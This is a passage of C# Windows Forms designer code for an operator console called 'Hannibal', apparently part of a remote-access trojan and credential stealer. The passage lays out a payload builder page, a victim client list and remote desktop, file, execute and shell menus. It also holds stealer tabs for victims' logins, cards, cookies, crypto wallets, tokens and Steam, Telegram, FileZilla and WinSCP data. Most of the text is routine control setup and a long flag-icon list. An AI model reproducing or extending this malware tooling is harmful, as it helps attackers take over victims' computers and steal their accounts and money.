            this.dataGridViewTextBoxColumn64 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn65 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn66 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn67 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn68 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.FoxmailPage = new System.Windows.Forms.TabPage();
            this.StealerFoxmailDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn71 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn72 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn73 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn74 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.WinscpPage = new System.Windows.Forms.TabPage();
            this.StealerWinscpDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.dataGridViewTextBoxColumn78 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn79 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn80 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn81 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.dataGridViewTextBoxColumn82 = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.MainKryptonPalette = new ComponentFactory.Krypton.Toolkit.KryptonPalette(this.components);
            this.guna2GradientPanel1 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.guna2GradientPanel2 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.StealerSearchClear = new Guna.UI2.WinForms.Guna2Button();
            this.StealerSearchTextbox = new Guna.UI2.WinForms.Guna2TextBox();
            this.StealerSearchbarLabel = new System.Windows.Forms.Label();
            this.StealerSearchBtn = new Guna.UI2.WinForms.Guna2Button();
            this.guna2GradientPanel3 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.StealerSaveBtn = new Guna.UI2.WinForms.Guna2Button();
            this.StealerCopyBtn = new Guna.UI2.WinForms.Guna2Button();
            this.StealerDeleteBtn = new Guna.UI2.WinForms.Guna2Button();
            this.StealerDeleteLogsbtn = new Guna.UI2.WinForms.Guna2Button();
            this.StealerFilterBtn = new Guna.UI2.WinForms.Guna2Button();
            this.AutoTasksPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.NotiTasksDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.User3Col = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.TimeCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Task2Col = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.guna2GradientButton5 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.TasksDataGridView = new Guna.UI2.WinForms.Guna2DataGridView();
            this.TriggerCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.TaskCol = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Param1Col = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Param2Col = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Param3Col = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.AboutPage = new ComponentFactory.Krypton.Navigator.KryptonPage();
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.LabelCol = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.notifyIconContextMenuStrip = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.OpenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.HideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.tooltip = new System.Windows.Forms.ToolTip(this.components);
            this.ClientContextMenuStrip.SuspendLayout();
            this.statusStrip.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.TabsControl)).BeginInit();
            this.TabsControl.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientsPage)).BeginInit();
            this.ClientsPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientsDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.EventLogDataGridView)).BeginInit();
            this.EventLogsContextMenuStrip.SuspendLayout();
            this.EventLogTopPanel.SuspendLayout();
            this.clientInfoPanel.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.clientInfoPictureBox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.ServerPage)).BeginInit();
            this.ServerPage.SuspendLayout();
            this.guna2GroupBox2.SuspendLayout();
            this.guna2GroupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ncPort)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.BuilderPage)).BeginInit();
            this.BuilderPage.SuspendLayout();
            this.guna2GroupBox3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).BeginInit();
            this.guna2GroupBox6.SuspendLayout();
            this.guna2GroupBox5.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownDelay)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownPort)).BeginInit();
            this.BuilderContextMenuStrip.SuspendLayout();
            this.guna2GroupBox4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.kryptonPage1)).BeginInit();
            this.kryptonPage1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.NotificationDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.NotiDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.GraphViewPage)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.StealerLogsPage)).BeginInit();
            this.StealerLogsPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerTabControl)).BeginInit();
            this.StealerTabControl.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.LoginsPage)).BeginInit();
            this.LoginsPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerLoginsDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.AutofillsPage)).BeginInit();
            this.AutofillsPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerAutofillsDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.CardsPage)).BeginInit();
            this.CardsPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerCardsDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.CryptoinfoPage)).BeginInit();
            this.CryptoinfoPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerCryptoInfoDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.CookiesPage)).BeginInit();
            this.CookiesPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerCookiesDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.HistoryPage)).BeginInit();
            this.HistoryPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerHistoryDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.DownloadsPage)).BeginInit();
            this.DownloadsPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerDownloadsDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.AppsPage)).BeginInit();
            this.AppsPage.SuspendLayout();
            this.StealerAppsTabControl.SuspendLayout();
            this.TokensPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerTokensDataGridView)).BeginInit();
            this.TelegramPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.guna2DataGridView1)).BeginInit();
            this.SteamPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerSteamDataGridView)).BeginInit();
            this.ObsPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerObsDataGridView)).BeginInit();
            this.NgrokPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerNgrokDataGridView)).BeginInit();
            this.FilaZillaPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerFilezillaDataGridView)).BeginInit();
            this.FoxmailPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerFoxmailDataGridView)).BeginInit();
            this.WinscpPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.StealerWinscpDataGridView)).BeginInit();
            this.guna2GradientPanel1.SuspendLayout();
            this.guna2GradientPanel2.SuspendLayout();
            this.guna2GradientPanel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.AutoTasksPage)).BeginInit();
            this.AutoTasksPage.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.NotiTasksDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.TasksDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.AboutPage)).BeginInit();
            this.notifyIconContextMenuStrip.SuspendLayout();
            this.SuspendLayout();
            // 
            // imgFlags
            // 
            this.imgFlags.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imgFlags.ImageStream")));
            this.imgFlags.TransparentColor = System.Drawing.Color.Transparent;
            this.imgFlags.Images.SetKeyName(0, "ad.png");
            this.imgFlags.Images.SetKeyName(1, "ae.png");
            this.imgFlags.Images.SetKeyName(2, "af.png");
            this.imgFlags.Images.SetKeyName(3, "ag.png");
            this.imgFlags.Images.SetKeyName(4, "ai.png");
            this.imgFlags.Images.SetKeyName(5, "al.png");
            this.imgFlags.Images.SetKeyName(6, "am.png");
            this.imgFlags.Images.SetKeyName(7, "an.png");
            this.imgFlags.Images.SetKeyName(8, "ao.png");
            this.imgFlags.Images.SetKeyName(9, "ar.png");
            this.imgFlags.Images.SetKeyName(10, "as.png");
            this.imgFlags.Images.SetKeyName(11, "at.png");
            this.imgFlags.Images.SetKeyName(12, "au.png");
            this.imgFlags.Images.SetKeyName(13, "aw.png");
            this.imgFlags.Images.SetKeyName(14, "ax.png");
            this.imgFlags.Images.SetKeyName(15, "az.png");
            this.imgFlags.Images.SetKeyName(16, "ba.png");
            this.imgFlags.Images.SetKeyName(17, "bb.png");
            this.imgFlags.Images.SetKeyName(18, "bd.png");
            this.imgFlags.Images.SetKeyName(19, "be.png");
            this.imgFlags.Images.SetKeyName(20, "bf.png");
            this.imgFlags.Images.SetKeyName(21, "bg.png");
            this.imgFlags.Images.SetKeyName(22, "bh.png");
            this.imgFlags.Images.SetKeyName(23, "bi.png");
            this.imgFlags.Images.SetKeyName(24, "bj.png");
            this.imgFlags.Images.SetKeyName(25, "bm.png");
            this.imgFlags.Images.SetKeyName(26, "bn.png");
            this.imgFlags.Images.SetKeyName(27, "bo.png");
            this.imgFlags.Images.SetKeyName(28, "br.png");
            this.imgFlags.Images.SetKeyName(29, "bs.png");
            this.imgFlags.Images.SetKeyName(30, "bt.png");
            this.imgFlags.Images.SetKeyName(31, "bv.png");
            this.imgFlags.Images.SetKeyName(32, "bw.png");
            this.imgFlags.Images.SetKeyName(33, "by.png");
            this.imgFlags.Images.SetKeyName(34, "bz.png");
            this.imgFlags.Images.SetKeyName(35, "ca.png");
            this.imgFlags.Images.SetKeyName(36, "catalonia.png");
            this.imgFlags.Images.SetKeyName(37, "cc.png");
            this.imgFlags.Images.SetKeyName(38, "cd.png");
            this.imgFlags.Images.SetKeyName(39, "cf.png");
            this.imgFlags.Images.SetKeyName(40, "cg.png");
            this.imgFlags.Images.SetKeyName(41, "ch.png");
            this.imgFlags.Images.SetKeyName(42, "ci.png");
            this.imgFlags.Images.SetKeyName(43, "ck.png");
            this.imgFlags.Images.SetKeyName(44, "cl.png");
            this.imgFlags.Images.SetKeyName(45, "cm.png");
            this.imgFlags.Images.SetKeyName(46, "cn.png");
            this.imgFlags.Images.SetKeyName(47, "co.png");
            this.imgFlags.Images.SetKeyName(48, "cr.png");
            this.imgFlags.Images.SetKeyName(49, "cs.png");
            this.imgFlags.Images.SetKeyName(50, "cu.png");
            this.imgFlags.Images.SetKeyName(51, "cv.png");
            this.imgFlags.Images.SetKeyName(52, "cx.png");
            this.imgFlags.Images.SetKeyName(53, "cy.png");
            this.imgFlags.Images.SetKeyName(54, "cz.png");
            this.imgFlags.Images.SetKeyName(55, "de.png");
            this.imgFlags.Images.SetKeyName(56, "dj.png");
            this.imgFlags.Images.SetKeyName(57, "dk.png");
            this.imgFlags.Images.SetKeyName(58, "dm.png");
            this.imgFlags.Images.SetKeyName(59, "do.png");
            this.imgFlags.Images.SetKeyName(60, "dz.png");
            this.imgFlags.Images.SetKeyName(61, "ec.png");
            this.imgFlags.Images.SetKeyName(62, "ee.png");
            this.imgFlags.Images.SetKeyName(63, "eg.png");
            this.imgFlags.Images.SetKeyName(64, "eh.png");
            this.imgFlags.Images.SetKeyName(65, "england.png");
            this.imgFlags.Images.SetKeyName(66, "er.png");
            this.imgFlags.Images.SetKeyName(67, "es.png");
            this.imgFlags.Images.SetKeyName(68, "et.png");
            this.imgFlags.Images.SetKeyName(69, "europeanunion.png");
            this.imgFlags.Images.SetKeyName(70, "fam.png");
            this.imgFlags.Images.SetKeyName(71, "fi.png");
            this.imgFlags.Images.SetKeyName(72, "fj.png");
            this.imgFlags.Images.SetKeyName(73, "fk.png");
            this.imgFlags.Images.SetKeyName(74, "fm.png");
            this.imgFlags.Images.SetKeyName(75, "fo.png");
            this.imgFlags.Images.SetKeyName(76, "fr.png");
            this.imgFlags.Images.SetKeyName(77, "ga.png");
            this.imgFlags.Images.SetKeyName(78, "gb.png");
            this.imgFlags.Images.SetKeyName(79, "gd.png");
            this.imgFlags.Images.SetKeyName(80, "ge.png");
            this.imgFlags.Images.SetKeyName(81, "gf.png");
            this.imgFlags.Images.SetKeyName(82, "gh.png");
            this.imgFlags.Images.SetKeyName(83, "gi.png");
            this.imgFlags.Images.SetKeyName(84, "gl.png");
            this.imgFlags.Images.SetKeyName(85, "gm.png");
            this.imgFlags.Images.SetKeyName(86, "gn.png");
            this.imgFlags.Images.SetKeyName(87, "gp.png");
            this.imgFlags.Images.SetKeyName(88, "gq.png");
            this.imgFlags.Images.SetKeyName(89, "gr.png");
            this.imgFlags.Images.SetKeyName(90, "gs.png");
            this.imgFlags.Images.SetKeyName(91, "gt.png");
            this.imgFlags.Images.SetKeyName(92, "gu.png");
            this.imgFlags.Images.SetKeyName(93, "gw.png");
            this.imgFlags.Images.SetKeyName(94, "gy.png");
            this.imgFlags.Images.SetKeyName(95, "hk.png");
            this.imgFlags.Images.SetKeyName(96, "hm.png");
            this.imgFlags.Images.SetKeyName(97, "hn.png");
            this.imgFlags.Images.SetKeyName(98, "hr.png");
            this.imgFlags.Images.SetKeyName(99, "ht.png");
            this.imgFlags.Images.SetKeyName(100, "hu.png");
            this.imgFlags.Images.SetKeyName(101, "id.png");
            this.imgFlags.Images.SetKeyName(102, "ie.png");
            this.imgFlags.Images.SetKeyName(103, "il.png");
            this.imgFlags.Images.SetKeyName(104, "in.png");
            this.imgFlags.Images.SetKeyName(105, "io.png");
            this.imgFlags.Images.SetKeyName(106, "iq.png");
            this.imgFlags.Images.SetKeyName(107, "ir.png");
            this.imgFlags.Images.SetKeyName(108, "is.png");
            this.imgFlags.Images.SetKeyName(109, "it.png");
            this.imgFlags.Images.SetKeyName(110, "jm.png");
            this.imgFlags.Images.SetKeyName(111, "jo.png");
            this.imgFlags.Images.SetKeyName(112, "jp.png");
            this.imgFlags.Images.SetKeyName(113, "ke.png");
            this.imgFlags.Images.SetKeyName(114, "kg.png");
            this.imgFlags.Images.SetKeyName(115, "kh.png");
            this.imgFlags.Images.SetKeyName(116, "ki.png");
            this.imgFlags.Images.SetKeyName(117, "km.png");
            this.imgFlags.Images.SetKeyName(118, "kn.png");
            this.imgFlags.Images.SetKeyName(119, "kp.png");
            this.imgFlags.Images.SetKeyName(120, "kr.png");
            this.imgFlags.Images.SetKeyName(121, "kw.png");
            this.imgFlags.Images.SetKeyName(122, "ky.png");
            this.imgFlags.Images.SetKeyName(123, "kz.png");
            this.imgFlags.Images.SetKeyName(124, "la.png");
            this.imgFlags.Images.SetKeyName(125, "lb.png");
            this.imgFlags.Images.SetKeyName(126, "lc.png");
            this.imgFlags.Images.SetKeyName(127, "li.png");
            this.imgFlags.Images.SetKeyName(128, "lk.png");
            this.imgFlags.Images.SetKeyName(129, "lr.png");
            this.imgFlags.Images.SetKeyName(130, "ls.png");
            this.imgFlags.Images.SetKeyName(131, "lt.png");
            this.imgFlags.Images.SetKeyName(132, "lu.png");
            this.imgFlags.Images.SetKeyName(133, "lv.png");
            this.imgFlags.Images.SetKeyName(134, "ly.png");
            this.imgFlags.Images.SetKeyName(135, "ma.png");
            this.imgFlags.Images.SetKeyName(136, "mc.png");
            this.imgFlags.Images.SetKeyName(137, "md.png");
            this.imgFlags.Images.SetKeyName(138, "me.png");
            this.imgFlags.Images.SetKeyName(139, "mg.png");
            this.imgFlags.Images.SetKeyName(140, "mh.png");
            this.imgFlags.Images.SetKeyName(141, "mk.png");
            this.imgFlags.Images.SetKeyName(142, "ml.png");
            this.imgFlags.Images.SetKeyName(143, "mm.png");
            this.imgFlags.Images.SetKeyName(144, "mn.png");
            this.imgFlags.Images.SetKeyName(145, "mo.png");
            this.imgFlags.Images.SetKeyName(146, "mp.png");
            this.imgFlags.Images.SetKeyName(147, "mq.png");
            this.imgFlags.Images.SetKeyName(148, "mr.png");
            this.imgFlags.Images.SetKeyName(149, "ms.png");
            this.imgFlags.Images.SetKeyName(150, "mt.png");
            this.imgFlags.Images.SetKeyName(151, "mu.png");
            this.imgFlags.Images.SetKeyName(152, "mv.png");
            this.imgFlags.Images.SetKeyName(153, "mw.png");
            this.imgFlags.Images.SetKeyName(154, "mx.png");
            this.imgFlags.Images.SetKeyName(155, "my.png");
            this.imgFlags.Images.SetKeyName(156, "mz.png");
            this.imgFlags.Images.SetKeyName(157, "na.png");
            this.imgFlags.Images.SetKeyName(158, "nc.png");
            this.imgFlags.Images.SetKeyName(159, "ne.png");
            this.imgFlags.Images.SetKeyName(160, "nf.png");
            this.imgFlags.Images.SetKeyName(161, "ng.png");
            this.imgFlags.Images.SetKeyName(162, "ni.png");
            this.imgFlags.Images.SetKeyName(163, "nl.png");
            this.imgFlags.Images.SetKeyName(164, "no.png");
            this.imgFlags.Images.SetKeyName(165, "np.png");
            this.imgFlags.Images.SetKeyName(166, "nr.png");
            this.imgFlags.Images.SetKeyName(167, "nu.png");
            this.imgFlags.Images.SetKeyName(168, "nz.png");
            this.imgFlags.Images.SetKeyName(169, "om.png");
            this.imgFlags.Images.SetKeyName(170, "pa.png");
            this.imgFlags.Images.SetKeyName(171, "pe.png");
            this.imgFlags.Images.SetKeyName(172, "pf.png");
            this.imgFlags.Images.SetKeyName(173, "pg.png");
            this.imgFlags.Images.SetKeyName(174, "ph.png");
            this.imgFlags.Images.SetKeyName(175, "pk.png");
            this.imgFlags.Images.SetKeyName(176, "pl.png");
            this.imgFlags.Images.SetKeyName(177, "pm.png");
            this.imgFlags.Images.SetKeyName(178, "pn.png");
            this.imgFlags.Images.SetKeyName(179, "pr.png");
            this.imgFlags.Images.SetKeyName(180, "ps.png");
            this.imgFlags.Images.SetKeyName(181, "pt.png");
            this.imgFlags.Images.SetKeyName(182, "pw.png");
            this.imgFlags.Images.SetKeyName(183, "py.png");
            this.imgFlags.Images.SetKeyName(184, "qa.png");
            this.imgFlags.Images.SetKeyName(185, "re.png");
            this.imgFlags.Images.SetKeyName(186, "ro.png");
            this.imgFlags.Images.SetKeyName(187, "rs.png");
            this.imgFlags.Images.SetKeyName(188, "ru.png");
            this.imgFlags.Images.SetKeyName(189, "rw.png");
            this.imgFlags.Images.SetKeyName(190, "sa.png");
            this.imgFlags.Images.SetKeyName(191, "sb.png");
            this.imgFlags.Images.SetKeyName(192, "sc.png");
            this.imgFlags.Images.SetKeyName(193, "scotland.png");
            this.imgFlags.Images.SetKeyName(194, "sd.png");
            this.imgFlags.Images.SetKeyName(195, "se.png");
            this.imgFlags.Images.SetKeyName(196, "sg.png");
            this.imgFlags.Images.SetKeyName(197, "sh.png");
            this.imgFlags.Images.SetKeyName(198, "si.png");
            this.imgFlags.Images.SetKeyName(199, "sj.png");
            this.imgFlags.Images.SetKeyName(200, "sk.png");
            this.imgFlags.Images.SetKeyName(201, "sl.png");
            this.imgFlags.Images.SetKeyName(202, "sm.png");
            this.imgFlags.Images.SetKeyName(203, "sn.png");
            this.imgFlags.Images.SetKeyName(204, "so.png");
            this.imgFlags.Images.SetKeyName(205, "sr.png");
            this.imgFlags.Images.SetKeyName(206, "st.png");
            this.imgFlags.Images.SetKeyName(207, "sv.png");
            this.imgFlags.Images.SetKeyName(208, "sy.png");
            this.imgFlags.Images.SetKeyName(209, "sz.png");
            this.imgFlags.Images.SetKeyName(210, "tc.png");
            this.imgFlags.Images.SetKeyName(211, "td.png");
            this.imgFlags.Images.SetKeyName(212, "tf.png");
            this.imgFlags.Images.SetKeyName(213, "tg.png");
            this.imgFlags.Images.SetKeyName(214, "th.png");
            this.imgFlags.Images.SetKeyName(215, "tj.png");
            this.imgFlags.Images.SetKeyName(216, "tk.png");
            this.imgFlags.Images.SetKeyName(217, "tl.png");
            this.imgFlags.Images.SetKeyName(218, "tm.png");
            this.imgFlags.Images.SetKeyName(219, "tn.png");
            this.imgFlags.Images.SetKeyName(220, "to.png");
            this.imgFlags.Images.SetKeyName(221, "tr.png");
            this.imgFlags.Images.SetKeyName(222, "tt.png");
            this.imgFlags.Images.SetKeyName(223, "tv.png");
            this.imgFlags.Images.SetKeyName(224, "tw.png");
            this.imgFlags.Images.SetKeyName(225, "tz.png");
            this.imgFlags.Images.SetKeyName(226, "ua.png");
            this.imgFlags.Images.SetKeyName(227, "ug.png");
            this.imgFlags.Images.SetKeyName(228, "um.png");
            this.imgFlags.Images.SetKeyName(229, "us.png");
            this.imgFlags.Images.SetKeyName(230, "uy.png");
            this.imgFlags.Images.SetKeyName(231, "uz.png");
            this.imgFlags.Images.SetKeyName(232, "va.png");
            this.imgFlags.Images.SetKeyName(233, "vc.png");
            this.imgFlags.Images.SetKeyName(234, "ve.png");
            this.imgFlags.Images.SetKeyName(235, "vg.png");
            this.imgFlags.Images.SetKeyName(236, "vi.png");
            this.imgFlags.Images.SetKeyName(237, "vn.png");
            this.imgFlags.Images.SetKeyName(238, "vu.png");
            this.imgFlags.Images.SetKeyName(239, "wales.png");
            this.imgFlags.Images.SetKeyName(240, "wf.png");
            this.imgFlags.Images.SetKeyName(241, "ws.png");
            this.imgFlags.Images.SetKeyName(242, "ye.png");
            this.imgFlags.Images.SetKeyName(243, "yt.png");
            this.imgFlags.Images.SetKeyName(244, "za.png");
            this.imgFlags.Images.SetKeyName(245, "zm.png");
            this.imgFlags.Images.SetKeyName(246, "zw.png");
            this.imgFlags.Images.SetKeyName(247, "xy.png");
            // 
            // notifyIcon
            // 
            this.notifyIcon.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon.Icon")));
            this.notifyIcon.Text = "Hannibal";
            this.notifyIcon.Visible = true;
            this.notifyIcon.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon_MouseDoubleClick);
            // 
            // ClientContextMenuStrip
            // 
            this.ClientContextMenuStrip.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.ClientContextMenuStrip.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ClientContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.remoteDesktopToolStripMenuItem,
            this.fileManagerToolStripMenuItem,
            this.remoteExecuteToolStripMenuItem,
            this.toolStripSeparator,
            this.systemControlDropdown,
            this.toolStripMenuItem2,
            this.networkDropdown,
            this.stealerDropdown,
            this.miscellaneousToolStripMenuItem,
            this.toolStripSeparator3,
            this.actionsToolStripMenuItem,
            this.connectionToolStripMenuItem,
            this.selectAllToolStripMenuItem});
            this.ClientContextMenuStrip.Name = "ClientContextMenuStrip";
            this.ClientContextMenuStrip.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.ClientContextMenuStrip.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.ClientContextMenuStrip.RenderStyle.ColorTable = null;
            this.ClientContextMenuStrip.RenderStyle.RoundedEdges = false;
            this.ClientContextMenuStrip.RenderStyle.SelectionArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.ClientContextMenuStrip.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.ClientContextMenuStrip.RenderStyle.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.ClientContextMenuStrip.RenderStyle.SeparatorColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.ClientContextMenuStrip.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.ClientContextMenuStrip.Size = new System.Drawing.Size(162, 258);
            // 
            // remoteDesktopToolStripMenuItem
            // 
            this.remoteDesktopToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.remoteDesktopToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.monitor1;
            this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
            this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
            this.remoteDesktopToolStripMenuItem.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem_Click);
            // 
            // fileManagerToolStripMenuItem
            // 
            this.fileManagerToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.fileManagerToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.folder;
            this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
            this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.fileManagerToolStripMenuItem.Text = "File Explorer";
            this.fileManagerToolStripMenuItem.Click += new System.EventHandler(this.fileManagerToolStripMenuItem_Click);
            // 
            // remoteExecuteToolStripMenuItem
            // 
            this.remoteExecuteToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.remoteExecuteToolStripMenuItem.Image = global::InvokedServer.Properties.Resources.lightning;
            this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
            this.remoteExecuteToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
            this.remoteExecuteToolStripMenuItem.Text = "Remote Execute";
            this.remoteExecuteToolStripMenuItem.Click += new System.EventHandler(this.remoteExecuteToolStripMenuItem_Click);
            // 
            // toolStripSeparator
            // 
            this.toolStripSeparator.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.toolStripSeparator.Name = "toolStripSeparator";
            this.toolStripSeparator.Size = new System.Drawing.Size(158, 6);
            // 
            // systemControlDropdown
            // 
            this.systemControlDropdown.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.systemInformationToolStripMenuItem1,
            this.remoteShelltoolStripMenuItem,
            this.taskManagertoolStripMenuItem,
            this.startupManagertoolStripMenuItem,
            this.registryEditortoolStripMenuItem});
            this.systemControlDropdown.ForeColor = System.Drawing.SystemColors.Control;
            this.systemControlDropdown.Image = global::InvokedServer.Properties.Resources.computer;
            this.systemControlDropdown.Name = "systemControlDropdown";
            this.systemControlDropdown.Size = new System.Drawing.Size(161, 22);
            this.systemControlDropdown.Text = "System";
            // 
            // systemInformationToolStripMenuItem1
            // 
            this.systemInformationToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.systemInformationToolStripMenuItem1.ForeColor = System.Drawing.SystemColors.Control;
            this.systemInformationToolStripMenuItem1.Image = global::InvokedServer.Properties.Resources.information;
            this.systemInformationToolStripMenuItem1.Name = "systemInformationToolStripMenuItem1";
            this.systemInformationToolStripMenuItem1.Size = new System.Drawing.Size(178, 22);
            this.systemInformationToolStripMenuItem1.Text = "System Information";
